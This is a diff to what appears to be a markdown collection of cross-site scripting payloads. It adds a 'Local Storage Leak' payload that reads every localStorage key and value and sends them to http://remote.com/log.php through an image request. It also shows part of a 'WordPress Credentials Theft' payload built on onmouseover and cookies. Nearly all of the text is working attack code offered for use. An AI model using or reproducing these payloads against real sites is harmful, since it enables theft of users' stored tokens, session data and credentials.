@@ -2,6 +2,7 @@
 
 ## WordPress Credentials Theft
 <li>Payload</li>
+
 ```
 onmouseover="this.style.display='none';
 if (document.cookie.indexOf('visited')>=0) {}
@@ -12,5 +13,21 @@ else {
    document.cookie='visited=true;path=/;max-age='+60*10;
  };
 ```
+
 ## Local Storage Leak
+<li>Payload</li>
+
+```
+if (window.localStorage) {
+    if (localStorage.length) {
+            var output;
+            for (var i = 0; i < localStorage.length; i++) {
+                    if(i>0) { output += "&"; }
+                    output += encodeURIComponent(localStorage.key(i)) + '=' + encodeURIComponent(localStorage.getItem(localStorage.key(i)));
+            }
+            new Image().src = 'http://remote.com/log.php?'+output;
+	}
+}
+
+```
 
